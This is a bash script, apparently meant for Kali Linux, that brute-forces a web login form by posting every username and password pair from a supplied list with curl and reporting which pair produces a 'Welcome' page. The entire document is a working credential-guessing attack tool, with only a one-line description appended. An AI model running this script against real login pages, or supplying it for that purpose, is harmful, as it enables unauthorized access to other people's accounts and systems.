#!/bin/bash

# Define styling variables
bold=$(tput bold)
normal=$(tput sgr0)
green=$(tput setaf 2)
red=$(tput setaf 1)
yellow=$(tput setaf 3)

# Prompt user for login form URL and username/password list
read -p "Enter the login form URL: " url
read -p "Enter the path to the username/password list: " list_path

# Loop through username/password list and attempt login
echo "${bold}Starting brute force login on ${url}...${normal}"
while read -r line; do
    username=$(echo $line | cut -d ':' -f 1)
    password=$(echo $line | cut -d ':' -f 2)

    # Submit login form with current username/password combination
    response=$(curl --silent --data "username=$username&password=$password" $url)

    # Check if login was successful
    if [[ $response == *"Welcome, $username"* ]]; then
        echo "${green}[+] Successful login with username: ${username}, password: ${password}${normal}"
        exit 0
    else
        echo "${red}[-] Failed login with username: ${username}, password: ${password}${normal}"
    fi
done <$list_path

echo "${bold}Brute force login complete. No valid credentials found.${normal}"

## Kali version. This script attempts to brute force a login form using a list of usernames and passwords. It uses the curl command to submit the login form with each username and password combination.
